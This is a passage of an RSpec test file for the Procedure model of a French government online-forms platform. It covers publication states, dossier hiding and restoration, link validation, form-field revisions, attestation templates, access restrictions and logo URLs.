      expect(procedure.published_at).not_to be_nil
      expect(procedure.unpublished_at).to eq(now)
    }

    it 'sets published revision' do
      expect(procedure.published_revision).not_to be_nil
      expect(procedure.draft_revision).not_to be_nil
      expect(procedure.revisions.count).to eq(2)
      expect(procedure.revisions).to eq([procedure.published_revision, procedure.draft_revision])
    end
  end

  describe "#brouillon?" do
    let(:procedure_brouillon) { procedures.brouillon }
    let(:procedure_publiee) { procedures.individual }
    let(:procedure_close) { procedures.close }
    let(:procedure_depubliee) { procedures.depubliee }

    it do
      expect(procedure_brouillon.brouillon?).to be_truthy
      expect(procedure_publiee.brouillon?).to be_falsey
      expect(procedure_close.brouillon?).to be_falsey
      expect(procedure_depubliee.brouillon?).to be_falsey
    end
  end

  describe "#publiee?" do
    let(:procedure_brouillon) { procedures.brouillon }
    let(:procedure_publiee) { procedures.individual }
    let(:procedure_close) { procedures.close }
    let(:procedure_depubliee) { procedures.depubliee }

    it do
      expect(procedure_brouillon.publiee?).to be_falsey
      expect(procedure_publiee.publiee?).to be_truthy
      expect(procedure_close.publiee?).to be_falsey
      expect(procedure_depubliee.publiee?).to be_falsey
    end
  end

  describe "#close?" do
    let(:procedure_brouillon) { procedures.brouillon }
    let(:procedure_publiee) { procedures.individual }
    let(:procedure_close) { procedures.close }
    let(:procedure_depubliee) { procedures.depubliee }

    it do
      expect(procedure_brouillon.close?).to be_falsey
      expect(procedure_publiee.close?).to be_falsey
      expect(procedure_close.close?).to be_truthy
      expect(procedure_depubliee.close?).to be_falsey
    end
  end

  describe "#depubliee?" do
    let(:procedure_brouillon) { procedures.brouillon }
    let(:procedure_publiee) { procedures.individual }
    let(:procedure_close) { procedures.close }
    let(:procedure_depubliee) { procedures.depubliee }

    it do
      expect(procedure_brouillon.depubliee?).to be_falsey
      expect(procedure_publiee.depubliee?).to be_falsey
      expect(procedure_close.depubliee?).to be_falsey
      expect(procedure_depubliee.depubliee?).to be_truthy
    end
  end

  describe "#locked?" do
    let(:procedure_brouillon) { procedures.brouillon }
    let(:procedure_publiee) { procedures.individual }
    let(:procedure_close) { procedures.close }
    let(:procedure_depubliee) { procedures.depubliee }

    it do
      expect(procedure_brouillon.locked?).to be_falsey
      expect(procedure_publiee.locked?).to be_truthy
      expect(procedure_close.locked?).to be_truthy
      expect(procedure_depubliee.locked?).to be_truthy
    end
  end

  describe 'close' do
    let(:procedure) { procedures.individual }
    let(:now) { Time.zone.now.beginning_of_minute }
    before do
      travel_to(now) do
        procedure.close!
      end
      procedure.reload
    end

    it do
      expect(procedure.close?).to be_truthy
      expect(procedure.closed_at).to eq(now)
    end

    it 'sets published revision' do
      expect(procedure.published_revision).not_to be_nil
      expect(procedure.draft_revision).not_to be_nil
      expect(procedure.revisions.count).to eq(2)
      expect(procedure.revisions).to eq([procedure.published_revision, procedure.draft_revision])
    end
  end

  describe 'total_dossier' do
    let(:procedure) { procedures.individual }

    subject { procedure.total_dossier }

    # the seeded procedure has one dossier per state; only the brouillon is excluded
    it { is_expected.to eq(procedure.dossiers.count - 1) }
  end

  describe ".default_scope" do
    let!(:procedure) { create(:procedure, hidden_at: hidden_at) }

    context "when hidden_at is nil" do
      let(:hidden_at) { nil }

      it do
        expect(Procedure.all).to include(procedure)
      end
    end

    context "when hidden_at is not nil" do
      let(:hidden_at) { 2.days.ago }

      it do
        expect(Procedure.all).not_to include(procedure)
        expect { Procedure.find(procedure.id) }.to raise_error(ActiveRecord::RecordNotFound)
      end
    end
  end

  describe "#discard_and_keep_track!" do
    let(:super_admin) { create(:super_admin) }

    subject { procedure.discard_and_keep_track!(super_admin) }

    context "when discarding a procedure in brouillon" do
      let(:procedure) { procedures.brouillon }
      let!(:dossier) { create(:dossier, procedure:) }

      it 'destroys dossiers' do
        subject
        expect(procedure.dossiers.count).to eq(0)
      end
    end

    context "when discarding a published procedure" do
      let(:procedure) { create(:procedure, :published) }
      let!(:dossier) { create(:dossier, :en_construction, procedure:, hidden_by_administration_at: nil, hidden_by_reason: nil) }
      let!(:dossier_2) { create(:dossier, :accepte, procedure:, hidden_by_administration_at: nil, hidden_by_reason: nil) }

      it 'hides dossiers' do
        subject
        dossiers = procedure.dossiers
        expect(dossiers.count).to eq(2)
        expect(dossiers.pluck(:hidden_by_reason).uniq).to eq(['procedure_removed'])
        expect(dossiers.pluck(:hidden_by_administration_at)).to all(be_present)
      end
    end
  end

  describe "#restore" do
    let(:super_admin) { create(:super_admin) }
    let(:procedure) { create(:procedure, :discarded) }
    let!(:dossier) { create(:dossier, :accepte, procedure:, hidden_by_administration_at: Time.zone.now, hidden_by_reason: :procedure_removed) }
    let!(:dossier_2) { create(:dossier, :accepte, procedure:, hidden_by_administration_at: Time.zone.now, hidden_by_expired_at: Time.zone.now, hidden_by_reason: :expired) }

    subject { procedure.restore(super_admin) }

    it "restores only dossier that have been hidden by procedure_removed" do
      subject
      expect(dossier.reload.hidden_by_administration_at).to be_nil
      expect(dossier.hidden_by_reason).to be_nil
      expect(dossier_2.reload.hidden_by_administration_at).not_to be_nil
      expect(dossier_2.hidden_by_expired_at).not_to be_nil
      expect(dossier_2.hidden_by_reason).to eq('expired')
    end
  end

  describe "#organisation_name" do
    subject { procedure.organisation_name }
    context 'when the procedure has a service (and no organization)' do
      let(:procedure) { procedures.brouillon }
      it { is_expected.to eq procedure.service.nom }
    end

    context 'when the procedure has an organization (and no service)' do
      let(:procedure) { procedures.brouillon.tap { it.update!(organisation: 'DDT des Vosges', service: nil) } }
      it { is_expected.to eq procedure.organisation }
    end
  end

  describe '#juridique_required' do
    it 'automatically jumps to true once cadre_juridique or deliberation have been set' do
      p = create(
        :procedure,
        juridique_required: false,
        cadre_juridique: nil
      )

      expect(p.juridique_required).to be_falsey

      p.update(cadre_juridique: 'cadre')
      expect(p.juridique_required).to be_truthy

      p.update(cadre_juridique: nil)
      expect(p.juridique_required).to be_truthy

      p.update_columns(cadre_juridique: nil, juridique_required: false)
      p.reload
      expect(p.juridique_required).to be_falsey

      @deliberation = fixture_file_upload('spec/fixtures/files/file.pdf', 'application/pdf')
      p.update(deliberation: @deliberation)
      p.reload
      expect(p.juridique_required).to be_truthy
    end
  end

  describe '.ensure_a_groupe_instructeur_exists' do
    let(:procedure) { create(:procedure, groupe_instructeurs: []) }

    it do
      expect(procedure.groupe_instructeurs.count).to eq(1)
      expect(procedure.groupe_instructeurs.first.label).to eq(GroupeInstructeur::DEFAUT_LABEL)
      expect(procedure.defaut_groupe_instructeur_id).not_to be_nil
    end
  end

  describe '.missing_instructeurs?' do
    let!(:procedure) { procedures.brouillon }

    subject { procedure.missing_instructeurs? }

    it { is_expected.to be true }

    context 'when an instructeur is assign to this procedure' do
      before { instructeurs.default.assign_to_procedure(procedure) }

      it { is_expected.to be false }
    end
  end

  describe '.missing_zones?' do
    let(:procedure) { procedures.brouillon }

    subject { procedure.missing_zones? }

    it { is_expected.to be true }

    context 'when a procedure has zones' do
      before { procedure.zones << zones.default }

      it { is_expected.to be false }
    end
  end

  describe '.missing_steps' do
    subject { procedure.missing_steps.include?(step) }

    context 'without zone' do
      let(:procedure) { procedures.brouillon }
      let(:step) { :zones }
      it { is_expected.to be_truthy }
    end

    context 'with zone' do
      let(:procedure) { procedures.individual }
      let(:step) { :zones }
      it { is_expected.to be_falsey }
    end

    context 'without service' do
      let(:procedure) { create(:procedure, service: nil) }
      let(:step) { :service }
      it { is_expected.to be_truthy }
    end

    context 'with service' do
      let(:procedure) { create(:procedure) }
      let(:step) { :service }
      it { is_expected.to be_truthy }
    end
  end

  describe "#destroy" do
    let(:procedure) { procedures.close }

    before do
      create(:bulk_message, procedure:)
      procedure.discard!
    end

    it "can destroy procedure" do
      expect(procedure.revisions.count).to eq(2)
      expect(procedure.destroy).to be_truthy
    end

    it "destroys its types de champ" do
      type_de_champ_ids = procedure.type_de_champs.ids
      expect(type_de_champ_ids.size).to eq(procedure.draft_revision.type_de_champs.size)

      expect { procedure.destroy }.to change { TypeDeChamp.where(id: type_de_champ_ids).count }.from(type_de_champ_ids.size).to(0)
    end

    it "destroys associated dossiers_list_personnalisations" do
      personnalisation = create(:dossiers_list_personnalisation, procedure:)

      expect(procedure.destroy).to be_truthy
      expect { personnalisation.reload }.to raise_error(ActiveRecord::RecordNotFound)
    end

    # No model maps those tables since the STI switch: only their cascade
    # protects the destroy, until they are dropped.
    it "destroys the rows left in the legacy mail tables" do
      connection = ActiveRecord::Base.connection
      %w[initiated_mails received_mails closed_mails refused_mails without_continuation_mails].each do |table|
        connection.execute(<<~SQL.squish)
          INSERT INTO #{table} (subject, body, procedure_id, created_at, updated_at)
          VALUES ('legacy subject', 'legacy body', #{procedure.id}, NOW(), NOW())
        SQL
      end

      expect(procedure.destroy).to be_truthy
    end
  end

  describe '#average_dossier_weight' do
    let(:procedure) { create(:procedure, :published, public_type_de_champs: [{ type: :piece_justificative }]) }

    before do
      [4, 5, 6].each do |byte_size|
        dossier = create(:dossier, :accepte, :with_populated_champs, procedure:)
        dossier.champs.flat_map(&:piece_justificative_file_attachments).each { it.blob.update!(byte_size:) }
      end
    end

    it 'estimates average dossier weight' do
      expect(procedure.reload.average_dossier_weight).to eq(5 + Procedure::MIN_WEIGHT)
    end
  end

  describe 'lien_dpo' do
    let(:procedure) { procedures.brouillon }

    it do
      expect(procedure.valid?).to be(true)
      procedure.lien_dpo = 'dpo@ministere.amere'
      expect(procedure.valid?).to be(true)
      procedure.lien_dpo = 'https://legal.fr/contact_dpo'
      expect(procedure.valid?).to be(true)
      procedure.lien_dpo = 'askjdlad l akdj asd '
      expect(procedure.valid?).to be(false)
    end
  end

  describe 'factory' do
    let(:type_de_champs) { [{ type: :yes_no }, { type: :integer_number }] }

    context 'create' do
      let(:type_de_champs) { [{ type: :yes_no }, { type: :repetition, children: [{ type: :integer_number }] }] }
      let(:procedure) { create(:procedure, public_type_de_champs: type_de_champs) }

      context 'with brouillon procedure' do
        it do
          expect(procedure.draft_revision.public_root_type_de_champs.count).to eq(2)
          expect(procedure.draft_revision.type_de_champs.count).to eq(3)
        end
      end

      context 'with published procedure' do
        let(:procedure) { create(:procedure, :published, public_type_de_champs: type_de_champs) }

        it do
          expect(procedure.draft_revision.public_root_type_de_champs.count).to eq(2)
          expect(procedure.draft_revision.type_de_champs.count).to eq(3)
          expect(procedure.published_revision.public_root_type_de_champs.count).to eq(2)
          expect(procedure.published_revision.type_de_champs.count).to eq(3)
        end
      end
    end

    context 'with bouillon procedure' do
      let(:procedure) { build(:procedure, public_type_de_champs: type_de_champs, private_type_de_champs: type_de_champs) }

      it do
        expect(procedure.revisions.size).to eq(1)
        expect(procedure.draft_revision.type_de_champs.size).to eq(4)
        expect(procedure.draft_revision.public_root_type_de_champs.size).to eq(2)
        expect(procedure.published_revision).to be_nil
      end
    end

    context 'with published procedure' do
      let(:procedure) { build(:procedure, :published, public_type_de_champs: type_de_champs, private_type_de_champs: type_de_champs) }

      it do
        expect(procedure.revisions.size).to eq(2)
        expect(procedure.draft_revision.type_de_champs.size).to eq(4)
        expect(procedure.draft_revision.public_root_type_de_champs.size).to eq(2)
        expect(procedure.published_revision.type_de_champs.size).to eq(4)
        expect(procedure.published_revision.public_root_type_de_champs.size).to eq(2)
      end
    end

    context 'repetition' do
      let(:type_de_champs) do
        [
          { type: :yes_no },
          {
            type: :repetition,
            children: [
              { libelle: 'Nom', mandatory: true },
              { libelle: 'Prénom', mandatory: true },
              { libelle: 'Age', type: :integer_number, mandatory: false },
            ],
          },
        ]
      end
      let(:revision) { procedure.draft_revision }
      let(:repetition) { revision.public_revision_type_de_champs.last }

      context 'with bouillon procedure' do
        let(:procedure) { build(:procedure, public_type_de_champs: type_de_champs) }

        it do
          expect(revision.type_de_champs.size).to eq(5)
          expect(revision.public_root_type_de_champs.size).to eq(2)
          expect(revision.public_root_type_de_champs.map(&:type_champ)).to eq(['yes_no', 'repetition'])
          expect(repetition.revision_type_de_champs.size).to eq(3)
          expect(repetition.revision_type_de_champs.map(&:type_champ)).to eq(['text', 'text', 'integer_number'])
          expect(repetition.revision_type_de_champs.map(&:mandatory?)).to eq([true, true, false])
        end
      end

      context 'with published procedure' do
        let(:procedure) { build(:procedure, :published, public_type_de_champs: type_de_champs) }

        context 'draft revision' do
          it do
            expect(revision.type_de_champs.size).to eq(5)
            expect(revision.public_root_type_de_champs.size).to eq(2)
            expect(revision.public_root_type_de_champs.map(&:type_champ)).to eq(['yes_no', 'repetition'])
            expect(repetition.revision_type_de_champs.size).to eq(3)
            expect(repetition.revision_type_de_champs.map(&:type_champ)).to eq(['text', 'text', 'integer_number'])
            expect(repetition.revision_type_de_champs.map(&:mandatory?)).to eq([true, true, false])
          end
        end

        context 'published revision' do
          let(:revision) { procedure.published_revision }

          it do
            expect(revision.type_de_champs.size).to eq(5)
            expect(revision.public_root_type_de_champs.size).to eq(2)
            expect(revision.public_root_type_de_champs.map(&:type_champ)).to eq(['yes_no', 'repetition'])
            expect(repetition.revision_type_de_champs.size).to eq(3)
            expect(repetition.revision_type_de_champs.map(&:type_champ)).to eq(['text', 'text', 'integer_number'])
            expect(repetition.revision_type_de_champs.map(&:mandatory?)).to eq([true, true, false])
          end
        end
      end
    end
  end

  describe 'lien_notice' do
    let(:procedure) { procedures.brouillon.tap { it.lien_notice = lien_notice } }

    context 'when empty' do
      let(:lien_notice) { '' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid link' do
      let(:lien_notice) { 'https://demarche.numerique.gouv.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid link with accents' do
      let(:lien_notice) { 'https://www.démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when not a valid link' do
      let(:lien_notice) { 'www.démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_falsey }
    end

    context 'when an email' do
      let(:lien_notice) { 'test@demarches-simplifiees.fr' }
      it { expect(procedure.valid?).to be_falsey }
    end
  end

  describe 'lien_dpo' do
    let(:procedure) { procedures.brouillon.tap { it.lien_dpo = lien_dpo } }

    context 'when empty' do
      let(:lien_dpo) { '' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid link' do
      let(:lien_dpo) { 'https://demarche.numerique.gouv.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid link with accents' do
      let(:lien_dpo) { 'https://www.démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid email' do
      let(:lien_dpo) { 'test@demarche.numerique.gouv.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when valid email with accents' do
      let(:lien_dpo) { 'test@démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_truthy }
    end

    context 'when not a valid link' do
      let(:lien_dpo) { 'www.démarches-simplifiées.fr' }
      it { expect(procedure.valid?).to be_falsey }
    end
  end

  describe 'extend_conservation_for_dossiers' do
    let(:duree_conservation_dossiers_dans_ds) { 2 }
    let(:procedure) { create(:procedure, duree_conservation_dossiers_dans_ds:) }
    let(:expiring_dossier_brouillon) { create(:dossier, :brouillon, procedure: procedure, brouillon_close_to_expiration_notice_sent_at: duree_conservation_dossiers_dans_ds.months.ago) }
    let(:expiring_dossier_en_termine) { create(:dossier, :accepte, procedure: procedure, termine_close_to_expiration_notice_sent_at: duree_conservation_dossiers_dans_ds.months.ago) }
    let(:not_expiring_dossie) { create(:dossier, :accepte, procedure: procedure, created_at: duree_conservation_dossiers_dans_ds.months.ago) }
    before do
      procedure
      expiring_dossier_brouillon
      expiring_dossier_en_termine
      not_expiring_dossie
    end

    context 'when duree_conservation_dossiers_dans_ds does not changes' do
      it 'does not enqueues any job' do
        expect(ResetExpiringDossiersJob).not_to receive(:perform_later)
        procedure.update!(libelle: 'does not change duree_conservation_dossiers_dans_ds')
      end
    end

    context 'when duree_conservation_dossiers_dans_ds decreases' do
      it 'calls extend_conservation_for_dossiers' do
        expect(ResetExpiringDossiersJob).not_to receive(:perform_later)
        procedure.update(duree_conservation_dossiers_dans_ds: duree_conservation_dossiers_dans_ds - 1)
      end
    end

    context 'when duree_conservation_dossiers_dans_ds increases' do
      it 'calls extend_conservation_for_dossiers' do
        expect(ResetExpiringDossiersJob).to receive(:perform_later)
        procedure.update(duree_conservation_dossiers_dans_ds: duree_conservation_dossiers_dans_ds + 1)
      end
    end
  end

  describe "#attestation_template" do
    let(:procedure) { procedures.brouillon }
    subject { procedure.reload }

    context "when there is a v2 draft and a v1" do
      before do
        create(:attestation_template, procedure: procedure)
        create(:attestation_template, :v2, :draft, procedure: procedure)
      end

      it { expect(subject.attestation_acceptation_template.version).to eq(1) }
    end

    context "when there is only a v1" do
      before do
        create(:attestation_template, procedure: procedure)
      end

      it { expect(subject.attestation_acceptation_template.version).to eq(1) }
    end

    context "when there is only a v2" do
      before do
        create(:attestation_template, :v2, procedure: procedure)
      end

      it { expect(subject.attestation_acceptation_template.version).to eq(2) }
    end

    context "when there is a v2 draft" do
      before do
        create(:attestation_template, :v2, :draft, procedure: procedure)
      end

      it { expect(subject.attestation_acceptation_template).to be_nil }

      context "and a published" do
        before do
          create(:attestation_template, :v2, :published, procedure: procedure)
        end

        it { expect(subject.attestation_acceptation_template).to be_published }
      end
    end
  end

  describe "#parsed_latest_zone_labels" do
    let!(:draft_procedure) { procedures.brouillon }
    let!(:published_procedure) { procedures.individual }
    let!(:closed_procedure) { procedures.close }
    let!(:procedure_detail_draft) { ProcedureDetail.new(id: draft_procedure.id, latest_zone_labels: '{ "zone1", "zone2" }') }
    let!(:procedure_detail_published) { ProcedureDetail.new(id: published_procedure.id, latest_zone_labels: '{ "zone3", "zone4" }') }
    let!(:procedure_detail_closed) { ProcedureDetail.new(id: closed_procedure.id, latest_zone_labels: '{ "zone5", "zone6" }') }
    context 'with parsed latest zone labels' do
      it 'parses the latest zone labels correctly' do
        expect(procedure_detail_draft.parsed_latest_zone_labels).to eq(["zone1", "zone2"])
        expect(procedure_detail_published.parsed_latest_zone_labels).to eq(["zone3", "zone4"])
        expect(procedure_detail_closed.parsed_latest_zone_labels).to eq(["zone5", "zone6"])
      end

      it 'returns an empty array for invalid JSON' do
        procedure_detail_draft.latest_zone_labels = '{ invalid json }'
        expect(procedure_detail_draft.parsed_latest_zone_labels).to eq([])
      end

      it 'returns an empty array when latest_zone_labels is nil' do
        procedure_detail_draft.latest_zone_labels = nil
        expect(procedure_detail_draft.parsed_latest_zone_labels).to eq([])
      end

      it 'returns an empty array when latest_zone_labels is empty' do
        procedure_detail_draft.latest_zone_labels = ''
        expect(procedure_detail_draft.parsed_latest_zone_labels).to eq([])
      end
    end
  end

  describe '#all_revisions_type_de_champs' do
    let(:public_type_de_champs) do
      [
        { type: :text },
        { type: :header_section },
      ]
    end

    context 'when procedure brouillon' do
      let(:procedure) { create(:procedure, public_type_de_champs:) }

      it 'returns one type de champ' do
        expect(procedure.all_revisions_type_de_champs.size).to eq 1
      end

      it 'returns also section type de champ' do
        expect(procedure.all_revisions_type_de_champs(with_header_section: true).size).to eq 2
      end

      it "returns types de champ on draft revision" do
        procedure.draft_revision.add_type_de_champ(type_champ: :text, libelle: 'onemorechamp')
        expect(procedure.reload.all_revisions_type_de_champs.size).to eq 2
      end
    end

    context 'when procedure is published' do
      let(:procedure) { create(:procedure, :published, public_type_de_champs:) }

      it 'returns one type de champ' do
        expect(procedure.all_revisions_type_de_champs.size).to eq 1
      end

      it 'returns also section type de champ' do
        expect(procedure.all_revisions_type_de_champs(with_header_section: true).size).to eq 2
      end

      it "doesn't return types de champ on draft revision" do
        procedure.draft_revision.add_type_de_champ(type_champ: :text, libelle: 'onemorechamp')
        expect(procedure.reload.all_revisions_type_de_champs.size).to eq 1
      end
    end
  end

  describe '#update_labels_position' do
    let(:procedure) { procedures.brouillon }
    let!(:labels) { create_list(:label, 5, procedure_id: procedure.id) }

    it 'updates the positions of the specified instructeurs_procedures' do
      procedure.update_labels_position(labels.map(&:id))

      expect(procedure.labels.reload.pluck(:id, :position)).to match_array([
        [labels[0].id, 0],
        [labels[1].id, 1],
        [labels[2].id, 2],
        [labels[3].id, 3],
        [labels[4].id, 4],
      ])
    end
  end

  describe 'enable_pro_connect_for_moral_procedure callback' do
    context 'when creating a procedure for moral persons' do
      let(:procedure) { procedures.entreprise }

      it 'enables pro_connect_for_moral_procedure' do
        expect(procedure.pro_connect_for_moral_procedure).to be true
      end
    end

    context 'when creating a procedure for individuals' do
      let(:procedure) { procedures.individual }

      it 'does not enable pro_connect_for_moral_procedure' do
        expect(procedure.pro_connect_for_moral_procedure).to be false
      end
    end

    context 'when updating an existing moral procedure with the flag disabled' do
      let(:procedure) { procedures.entreprise }

      before do
        procedure.update_column(:pro_connect_for_moral_procedure, false)
      end

      it 'does not re-enable the flag on update' do
        procedure.update!(libelle: 'new libelle')
        expect(procedure.reload.pro_connect_for_moral_procedure).to be false
      end
    end
  end

  describe '#enable_pro_connect_restriction!' do
    let(:procedure) { procedures.brouillon }

    context 'when setting to :none' do
      it 'updates restriction level without changing opendata/robots_indexable' do
        procedure.enable_pro_connect_restriction!(:none)
        expect(procedure).to be_pro_connect_restriction_none
        expect(procedure.opendata).to be true
        expect(procedure.robots_indexable).to be true
      end
    end

    context 'when setting to :instructeurs' do
      it 'updates restriction level without changing opendata/robots_indexable' do
        procedure.enable_pro_connect_restriction!(:instructeurs)
        expect(procedure).to be_pro_connect_restriction_instructeurs
        expect(procedure.opendata).to be true
        expect(procedure.robots_indexable).to be true
      end
    end

    context 'when setting to :all' do
      it 'updates restriction level and disables opendata and robots_indexable' do
        procedure.enable_pro_connect_restriction!(:all)
        expect(procedure).to be_pro_connect_restriction_all
        expect(procedure.opendata).to be false
        expect(procedure.robots_indexable).to be false
      end
    end
  end

  describe '#champ_value_in_condition?' do
    include Logic
    let(:procedure) do
      create(:procedure, public_type_de_champs: [
        { type: :yes_no, libelle: 'gate' },
        { type: :integer_number, libelle: 'value' },
      ])
    end
    let(:revision) { procedure.draft_revision }
    let(:gate_tdc) { revision.public_root_type_de_champs.first }
    let(:value_tdc) { revision.public_root_type_de_champs.second }
    let(:gate_column) { procedure.find_column(label: 'gate') }

    subject { procedure.reload.champ_value_in_condition? }

    context 'with no conditions anywhere' do
      it { is_expected.to be(false) }
    end

    context 'when a draft_revision tdc condition uses a champ_value' do
      before { value_tdc.update!(condition: ds_eq(champ_value(gate_tdc.stable_id), constant(true))) }

      it { is_expected.to be(true) }
    end

    context 'when ineligibilite_rules uses a champ_value' do
      before { revision.update!(ineligibilite_rules: ds_eq(champ_value(gate_tdc.stable_id), constant(true))) }

      it { is_expected.to be(true) }
    end

    context 'when a routing_rule uses a champ_value' do
      before do
        create(:groupe_instructeur, procedure:, routing_rule: ds_eq(champ_value(gate_tdc.stable_id), constant(true)))
      end

      it { is_expected.to be(true) }
    end

    context 'when a champ_value is nested deep inside ineligibilite_rules' do
      before do
        revision.update!(ineligibilite_rules: ds_and([
          ds_eq(champ_column_value(gate_column), constant(true)),
          ds_eq(champ_value(gate_tdc.stable_id), constant(true)),
        ]))
      end

      it { is_expected.to be(true) }
    end

    context 'when only column_values are used everywhere' do
      before do
        value_tdc.update!(condition: ds_eq(champ_column_value(gate_column), constant(true)))
        revision.update!(ineligibilite_rules: ds_eq(champ_column_value(gate_column), constant(true)))
        create(:groupe_instructeur, procedure:, routing_rule: ds_eq(champ_column_value(gate_column), constant(true)))
      end

      it { is_expected.to be(false) }
    end
  end

  describe '#used_by_referentiel_urls?' do
    let(:procedure) { create(:procedure, public_type_de_champs: [{ type: :text, stable_id: 100 }, { type: :referentiel, stable_id: 200 }]) }
    let(:text_tdc) { procedure.draft_revision.type_de_champs.find { _1.stable_id == 100 } }
    let(:ref_tdc) { procedure.draft_revision.type_de_champs.find { _1.stable_id == 200 } }

    context 'when referentiel url_tiptap references the text field' do
      before do
        ref_tdc.update!(referentiel: create(:api_referentiel, :exact_match, url_tiptap: {
          "type" => "doc",
          "content" => [
            {
              "type" => "paragraph",
                        "content" => [
                          { "type" => "text", "text" => "https://api.gouv.fr/" },
                          { "type" => "mention", "attrs" => { "id" => "tdc100", "label" => "Texte" } },
                        ],
            },
          ],
        }, test_data_tiptap: { "tdc100" => "test" }))
      end

      it 'returns true for the referenced field' do
        expect(procedure.used_by_referentiel_urls?(text_tdc)).to be true
      end

      it 'returns false for the referentiel field itself' do
        expect(procedure.used_by_referentiel_urls?(ref_tdc)).to be false
      end
    end

    context 'when a drop_down_list type de champ has a CsvReferentiel' do
      let(:referentiel) { create(:csv_referentiel) }
      let(:procedure) { create(:procedure, public_type_de_champs: [{ type: :text, stable_id: 100 }, { type: :drop_down_list, stable_id: 200, referentiel:, drop_down_mode: 'advanced' }]) }

      it 'returns false without raising' do
        expect(procedure.used_by_referentiel_urls?(text_tdc)).to be false
      end
    end

    context 'when no referentiel' do
      it 'returns false' do
        expect(procedure.used_by_referentiel_urls?(text_tdc)).to be false
      end
    end

    context 'when referentiel has only {query} tag' do
      before do
        ref_tdc.update!(referentiel: create(:api_referentiel, :exact_match, url_tiptap: {
          "type" => "doc",
          "content" => [
            {
              "type" => "paragraph",
                        "content" => [
                          { "type" => "text", "text" => "https://api.gouv.fr/" },
                          { "type" => "mention", "attrs" => { "id" => "{query}", "label" => "Query" } },
                        ],
            },
          ],
        }, test_data_tiptap: { "{query}" => "test" }))
      end

      it 'returns false (query tag does not protect any field)' do
        expect(procedure.used_by_referentiel_urls?(text_tdc)).to be false
      end
    end
  end

  describe '#logo_url' do
    subject { procedure.logo_url }

    context 'without a logo' do
      let(:procedure) { create(:procedure) }

      it { is_expected.to match(%r{#{Rails.application.config.assets.prefix}/.*republique-francaise-logo}) }
    end

    # The variant is made by BlobProcessorJob. Reading the logo must not make one:
    # the web servers that render this page carry no image library.
    context 'with a logo whose variant is not made yet' do
      let(:procedure) { create(:procedure, :with_logo) }

      it 'returns the logo itself and makes no variant' do
        expect { subject }.not_to change { ActiveStorage::VariantRecord.count }
        expect(subject).to match(%r{/rails/active_storage/blobs/})
      end
    end

    context 'with a logo whose variant is made', :external_deps do
      let(:procedure) { create(:procedure, :with_logo) }

      before { procedure.logo.variant(resize_to_limit: [400, 400]).processed }

      it { is_expected.to match(%r{/rails/active_storage/disk/}) }
    end
  end

  private

  def create_dossier_with_pj_of_size(size, procedure)
    dossier = create(:dossier, :accepte, procedure: procedure)
    create(:champ_piece_justificative, size: size, dossier: dossier)
  end
end
